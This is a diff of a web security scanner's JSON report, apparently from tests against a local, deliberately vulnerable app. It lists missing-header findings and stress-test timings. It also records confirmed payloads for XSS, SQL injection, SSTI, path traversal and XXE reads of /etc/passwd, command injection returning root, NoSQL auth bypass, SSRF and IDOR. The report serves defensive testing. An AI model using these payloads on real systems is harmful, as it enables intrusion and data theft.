@@ -11,7 +11,7 @@
         "line": 0,
         "message": "Missing Content-Security-Policy (clickjacking/XSS mitigation)",
         "remediation": "Set the content-security-policy response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "missing_header_strict-transport-security",
@@ -22,7 +22,7 @@
         "line": 0,
         "message": "Missing HSTS; connections may downgrade to HTTP",
         "remediation": "Set the strict-transport-security response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "missing_header_x-frame-options",
@@ -33,7 +33,7 @@
         "line": 0,
         "message": "Missing X-Frame-Options; page can be framed (clickjacking)",
         "remediation": "Set the x-frame-options response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "missing_header_x-content-type-options",
@@ -44,7 +44,7 @@
         "line": 0,
         "message": "Missing X-Content-Type-Options: nosniff",
         "remediation": "Set the x-content-type-options response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "missing_header_referrer-policy",
@@ -55,7 +55,7 @@
         "line": 0,
         "message": "Missing Referrer-Policy; referrer may leak",
         "remediation": "Set the referrer-policy response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "missing_header_permissions-policy",
@@ -66,7 +66,7 @@
         "line": 0,
         "message": "Missing Permissions-Policy",
         "remediation": "Set the permissions-policy response header.",
-        "snippet": "http://127.0.0.1:40789"
+        "snippet": "http://127.0.0.1:39035"
       },
       {
         "rule_id": "insecure_cookie",
@@ -117,82 +117,122 @@
     "hardened_page_header_cookie_findings": 0
   },
   "pentest": {
-    "endpoints_tested": 6,
-    "confirmed_vulnerabilities": 5,
-    "confirmed": {
-      "xss@/search": [
-        {
-          "category": "xss",
-          "param": "q",
-          "payload": "<svg/onload=alert(1)>",
-          "confirmed": true,
-          "evidence": "<p>Results for <svg/onload=alert(1)></p>",
-          "cwe": "CWE-79",
-          "owasp": "A03:2021-Injection"
-        }
-      ],
-      "sqli@/user": [
-        {
-          "category": "sql_injection",
-          "param": "id",
-          "payload": "1' OR '1'='1",
-          "confirmed": true,
-          "evidence": "<pre>You have an error in your SQL syntax near '1' OR '1'='1'</pre>",
-          "cwe": "CWE-89",
-          "owasp": "A03:2021-Injection"
-        }
-      ],
-      "ssti@/render": [
-        {
-          "category": "ssti",
-          "param": "name",
-          "payload": "{{7*7}}",
-          "confirmed": true,
-          "evidence": "<p>Hello 49</p>",
-          "cwe": "CWE-1336",
-          "owasp": "A03:2021-Injection"
-        }
-      ],
-      "traversal@/file": [
-        {
-          "category": "path_traversal",
-          "param": "path",
-          "payload": "../../../../etc/passwd",
-          "confirmed": true,
-          "evidence": "root:x:0:0:root:/root:/bin/bash",
-          "cwe": "CWE-22",
-          "owasp": "A01:2021-Broken Access Control"
-        }
-      ],
-      "cmdi@/ping": [
-        {
-          "category": "command_injection",
-          "param": "host",
-          "payload": "127.0.0.1; id",
-          "confirmed": true,
-          "evidence": "PING 127.0.0.1; id\nuid=0(root) gid=0(root)",
-          "cwe": "CWE-78",
-          "owasp": "A03:2021-Injection"
-        }
-      ]
-    },
-    "safe_endpoint_confirmed": 0
+    "techniques_tested": 10,
+    "confirmed_vulnerabilities": 10,
+    "confirmed": [
+      {
+        "category": "xss",
+        "param": "q",
+        "payload": "<svg/onload=alert(1)>",
+        "confirmed": true,
+        "evidence": "<p>Results for <svg/onload=alert(1)></p>",
+        "cwe": "CWE-79",
+        "owasp": "A03:2021-Injection"
+      },
+      {
+        "category": "sql_injection",
+        "param": "id",
+        "payload": "1' OR '1'='1",
+        "confirmed": true,
+        "evidence": "<pre>You have an error in your SQL syntax near '1' OR '1'='1'</pre>",
+        "cwe": "CWE-89",
+        "owasp": "A03:2021-Injection"
+      },
+      {
+        "category": "ssti",
+        "param": "name",
+        "payload": "{{7*7}}",
+        "confirmed": true,
+        "evidence": "<p>Hello 49</p>",
+        "cwe": "CWE-1336",
+        "owasp": "A03:2021-Injection"
+      },
+      {
+        "category": "path_traversal",
+        "param": "path",
+        "payload": "../../../../etc/passwd",
+        "confirmed": true,
+        "evidence": "root:x:0:0:root:/root:/bin/bash",
+        "cwe": "CWE-22",
+        "owasp": "A01:2021-Broken Access Control"
+      },
+      {
+        "category": "command_injection",
+        "param": "host",
+        "payload": "127.0.0.1; id",
+        "confirmed": true,
+        "evidence": "PING 127.0.0.1; id\nuid=0(root) gid=0(root)",
+        "cwe": "CWE-78",
+        "owasp": "A03:2021-Injection"
+      },
+      {
+        "category": "nosql_injection",
+        "param": "pw",
+        "payload": "{\"$ne\": null}",
+        "confirmed": true,
+        "evidence": "Login OK (auth bypassed) welcome admin",
+        "cwe": "CWE-943",
+        "owasp": "A03:2021-Injection"
+      },
+      {
+        "category": "ssrf",
+        "param": "url",
+        "payload": "http://127.0.0.1:38855/a57b49d86e384f569123b0961f10e02c",
+        "confirmed": true,
+        "evidence": "callback a57b49d86e384f569123b0961f10e02c received",
+        "cwe": "CWE-918",
+        "owasp": "A10:2021-Server-Side Request Forgery"
+      },
+      {
+        "category": "xxe",
+        "param": "body",
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
+        "confirmed": true,
+        "evidence": "<result>root:x:0:0:root:/root:/bin/bash</result>",
+        "cwe": "CWE-611",
+        "owasp": "A05:2021-Security Misconfiguration"
+      },
+      {
+        "category": "idor",
+        "param": "id",
+        "payload": "id=[1001, 1002]",
+        "confirmed": true,
+        "evidence": "account id=1001 owner=user1001 balance=$100100",
+        "cwe": "CWE-639",
+        "owasp": "A01:2021-Broken Access Control"
+      },
+      {
+        "category": "auth_bypass",
+        "param": "-",
+        "payload": "GET /admin (no auth)",
+        "confirmed": true,
+        "evidence": "ADMIN PANEL \u2014 all users, delete, config",
+        "cwe": "CWE-862",
+        "owasp": "A01:2021-Broken Access Control"
+      }
+    ],
+    "control_false_positives": 0,
+    "controls": {
+      "xss@/safe-search": false,
+      "idor@/account-secure": false,
+      "authz@/admin-secure": false
+    }
   },
   "stress": {
-    "url": "http://127.0.0.1:40789/api",
+    "url": "http://127.0.0.1:39035/api",
     "requests": 300,
     "concurrency": 25,
-    "duration_s": 1.262,
+    "duration_s": 1.305,
     "ok": 300,
     "errors": 0,
     "rate_limited": 0,
-    "throughput_rps": 237.7,
+    "throughput_rps": 229.9,
     "latency_ms": {
-      "p50": 6.5,
-      "p90": 10.8,
-      "p99": 1240.5,
-      "max": 1245.7,
-      "mean": 73.4
+      "p50": 8.5,
+      "p90": 14.7,
+      "p99": 1238.2,
+      "max": 1245.6,
+      "mean": 76.1
     }
   }
 }
